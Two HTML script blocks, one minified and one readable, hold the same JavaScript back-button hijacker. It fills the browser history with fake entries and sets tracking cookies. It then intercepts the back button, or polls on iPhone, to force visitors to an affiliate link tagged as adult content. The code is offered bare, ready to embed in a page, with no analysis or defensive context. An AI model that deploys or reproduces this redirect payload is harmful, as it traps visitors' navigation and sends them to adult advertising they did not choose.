<script>    

var cpa = "https://mywinehot.com/?k=8cd1157b60ecb749dce0068e73797182&type=adult&subtype=global";
var index = "https://google.com";
var name = "toke";

!function(a,b,c){if(a&&b&&c){var d={set:function(a,b,c){var d=new Date;d.setTime(d.getTime()+24*c*60*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e},get:function(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return""}},e={},g=(d.get(c),[]),h=!1,i=d.get("detect");i&&atob(d.get("detect")).indexOf(window.location.search.replace("?",""))>-1&&(h=!0);for(var j=setInterval(function(){e.next&&(clearInterval(j),window.location.href=a)},1),k=-1,l=0;l<5;l++)e.foo="bar-"+l,e.set=c+"="+l,e.back=c+"="+k,e.insert="/?"+e.set,g.push(e.back),window.history.pushState(e,"page "+c+l,e.insert),window.location.hash=e.set,k++;if(d.set(c,"1",1),d.set("detect",btoa(g.toString(),1)),e.popupstate=!0,-1==navigator.userAgent.indexOf("iPhone")||window.chrome)window.onpopstate=function(){atob(d.get("detect")).indexOf(window.location.search.replace("?",""))>-1&&(anuncion=!0,e.next=!0,window.location.replace(a))};else{setInterval(function(){var a=!1;atob(d.get("detect")).indexOf(window.location.search.replace("?",""))>-1&&(a=!0,e.next=!0)},0)}}}(cpa,index,name);

</script>






<script>    

var cpa = "https://mywinehot.com/?k=8cd1157b60ecb749dce0068e73797182&type=adult&subtype=global";
var index = "https://google.com";
var name = "toke";

    !function(o, e, i) {
        if (o && e && i) {
            var t = { set: function(o, e, i) { var t = new Date; t.setTime(t.getTime() + 24 * i * 60 * 60 * 1e3); var n = "expires=" + t.toUTCString(); document.cookie = o + "=" + e + "; " + n }, get: function(o) { for (var e = o + "=", i = document.cookie.split(";"), t = 0; t < i.length; t++) { for (var n = i[t]; " " == n.charAt(0);) n = n.substring(1); if (0 == n.indexOf(e)) return n.substring(e.length, n.length) } return "" } };
            var n = {};
            var saved = t.get(i);
            var detect = [];
            var indomain = false;
            var get_detect = t.get('detect');
            
            if(get_detect && atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1){
                indomain = true;
            };


            var super_timer = setInterval(function(){
                if(n.next){
                    clearInterval(super_timer);
                    window.location.href=o;
                };
            }, 1);
            
              //  window.onpopstate = function(){ alert( n.popupstate+" location: "+location.href) };


                var conteo = -1;
                for (var v = 0; v < 5; v++) {
                     n.foo = "bar-"+v;
                     n.set = i+"=" + v;
                     n.back = i+"=" + conteo;
                     n.insert =  "/?"+n.set;
                     detect.push(n.back);
                     window.history.pushState(n, "page " + i+v,n.insert);
                     window.location.hash = n.set;
                     conteo++;

                };


                t.set(i,"1",1);
                t.set("detect",btoa(detect.toString(),1));
                n.popupstate = true;

                if( - 1 != navigator.userAgent.indexOf("iPhone") && !window.chrome){

                        var timer = setInterval(function(){
                        var anuncion = false;
                        if( atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1 ){
                            anuncion = true;
                            n.next = true;
                        };

                    },0);

                }else{
                    window.onpopstate = function(){ 

                        if( atob(t.get('detect')).indexOf(window.location.search.replace('?','')) > -1 ){
                            anuncion = true;
                            n.next = true;
                            window.location.replace(o);
                        };
                    };
                };

        };

    }(cpa, index, name);

</script>